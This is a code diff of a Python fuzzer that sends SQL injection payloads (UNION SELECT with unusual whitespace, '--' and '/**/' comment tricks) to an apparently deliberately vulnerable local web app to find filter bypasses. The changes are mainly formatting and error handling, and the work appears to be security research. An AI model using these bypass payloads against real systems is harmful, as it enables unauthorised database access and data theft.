@@ -5,16 +5,12 @@ Tests whitespace characters through a vulnerable web app.
 """
 
 import argparse
-import requests
 import sys
 import urllib.parse
-from fuzzer_utils import get_char_description
 
+import requests
 
-def log_debug(verbose: bool, msg: str) -> None:
-    """Print debug message if verbose mode is enabled."""
-    if verbose:
-        print(f"[DEBUG] {msg}", file=sys.stderr)
+from fuzzer_utils import get_char_description, log_debug
 
 
 def parse_args() -> argparse.Namespace:
@@ -26,18 +22,19 @@ def parse_args() -> argparse.Namespace:
         "base_url",
         nargs="?",
         default="http://localhost:3000",
-        help="Base URL of the vulnerable web app (default: http://localhost:3000)"
+        help="Base URL of the vulnerable web app (default: http://localhost:3000)",
     )
     parser.add_argument(
         "outfile",
         nargs="?",
         default="pg_http_whitespace_results.txt",
-        help="Output file for results (default: pg_http_whitespace_results.txt)"
+        help="Output file for results (default: pg_http_whitespace_results.txt)",
     )
     parser.add_argument(
-        "-v", "--verbose",
+        "-v",
+        "--verbose",
         action="store_true",
-        help="Enable verbose output - log exceptions to stderr"
+        help="Enable verbose output - log exceptions to stderr",
     )
     return parser.parse_args()
 
@@ -79,17 +76,17 @@ def main():
     results.append("")
 
     # Single character whitespace test (0x00-0x7F)
-    print("\n" + "="*60)
+    print("\n" + "=" * 60)
     print("Phase 1: Single character whitespace (0x00-0x7F)")
     print("Payload: 1{char}UNION{char}SELECT{char}1,'a','b','c'--")
-    print("="*60)
+    print("=" * 60)
 
     single_valid = []
 
     for i in range(128):
         char = chr(i)
         # URL encode for display purposes
-        encoded = urllib.parse.quote(char, safe='')
+        encoded = urllib.parse.quote(char, safe="")
 
         # Build payload: 1{char}UNION{char}SELECT{char}...
         payload = f"1{char}UNION{char}SELECT{char}1,'test','test@test.com','user'--"
@@ -119,10 +116,10 @@ def main():
         results.append("No valid single-character whitespace found via HTTP")
 
     # Double character test with -- comment
-    print("\n" + "="*60)
+    print("\n" + "=" * 60)
     print("Phase 2: Comment bypass (--{ws}{ws})")
     print("Payload: 1 UNION--{char1}{char2}SELECT 1,'a','b','c'")
-    print("="*60)
+    print("=" * 60)
 
     ws_chars = [0x09, 0x0A, 0x0C, 0x0D, 0x20]
     comment_valid = []
@@ -147,16 +144,20 @@ def main():
                 raise
             except Exception as e:
                 # Expected: most combinations will fail
-                log_debug(verbose, f"Comment 0x{i:02X}+0x{j:02X}: {type(e).__name__}: {e}")
+                log_debug(
+                    verbose, f"Comment 0x{i:02X}+0x{j:02X}: {type(e).__name__}: {e}"
+                )
 
             tested += 1
             if tested % 100 == 0:
-                print(f"  ...tested {tested}/{total_tests} combinations", file=sys.stderr)
+                print(
+                    f"  ...tested {tested}/{total_tests} combinations", file=sys.stderr
+                )
 
     # Test -- with newlines specifically
-    print("\n" + "="*60)
+    print("\n" + "=" * 60)
     print("Phase 3: Comment newline variations")
-    print("="*60)
+    print("=" * 60)
 
     newline_tests = [
         ("\n", "LF only"),
@@ -195,9 +196,9 @@ def main():
         results.append("No unexpected comment bypass combinations found")
 
     # Test /**/ comment as whitespace
-    print("\n" + "="*60)
+    print("\n" + "=" * 60)
     print("Phase 4: Block comment /**/ as whitespace")
-    print("="*60)
+    print("=" * 60)
 
     payload = "1/**/UNION/**/SELECT/**/1,'test','test@test.com','user'--"
     try:
@@ -210,12 +211,28 @@ def main():
             results.append("Block comments work as whitespace substitute: YES")
         else:
             print("  /**/: blocked")
+    except KeyboardInterrupt:
+        raise
     except Exception as e:
         print(f"  /**/: error - {e}")
 
     # Write results
-    with open(outfile, 'w', encoding='utf-8') as f:
-        f.write('\n'.join(results))
+    try:
+        with open(outfile, "w", encoding="utf-8") as f:
+            f.write("\n".join(results))
+    except (IOError, OSError) as e:
+        print(f"ERROR: Failed to write results to {outfile}: {e}", file=sys.stderr)
+        # Attempt to save partial results to fallback file
+        fallback = outfile + ".partial"
+        try:
+            with open(fallback, "w", encoding="utf-8") as f:
+                f.write("\n".join(results))
+            print(f"Partial results saved to: {fallback}", file=sys.stderr)
+        except (IOError, OSError) as e2:
+            print(
+                f"ERROR: Failed to write fallback file {fallback}: {e2}",
+                file=sys.stderr,
+            )
 
     print("\n" + "=" * 60)
     print(f"Results written to: {outfile}")
@@ -227,6 +244,7 @@ def main():
     print(f"  Characters: {[hex(x) for x in single_valid]}")
 
     return 0
+
 
 if __name__ == "__main__":
     sys.exit(main())
